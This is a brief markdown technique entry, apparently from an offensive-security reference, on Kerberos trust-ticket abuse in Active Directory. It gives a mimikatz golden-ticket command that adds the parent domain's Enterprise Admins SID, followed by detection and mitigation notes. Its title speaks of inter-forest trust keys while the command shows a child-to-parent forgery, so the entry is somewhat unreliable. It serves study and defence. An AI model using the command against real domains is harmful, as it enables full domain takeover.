---
id: trust_ticket
type: technique
label: "Inter-forest trust-ticket abuse"
phase: "hybrid"
tools: ["mimikatz", "impacket"]
cve: null
detect: "4769 for a cross-realm TGS."
mitre: "T1482 / T1558"
tag: null
---


# Inter-forest trust-ticket abuse

### Affected object / attribute
**Inter-realm trust key** (`trustedDomain` object / `krbtgt` of the trusted domain).

### Concept (deep)
With a **trust key**, forge a **referral/trust ticket** to impersonate a user from the trusted domain — cross-forest pivot.

### Commands
```plaintext
mimikatz # kerberos::golden /user:Administrator \
  /domain:child.corp.local /sid:S-1-5-21-CHILD \
  /sids:S-1-5-21-PARENT-519 \
  /krbtgt:<child_krbtgt> /ptt
```

### Detection
**4769 cross-realm** with SID filtering bypass; enable **SID filtering** (`Quarantine`) and rotate trust keys.

---
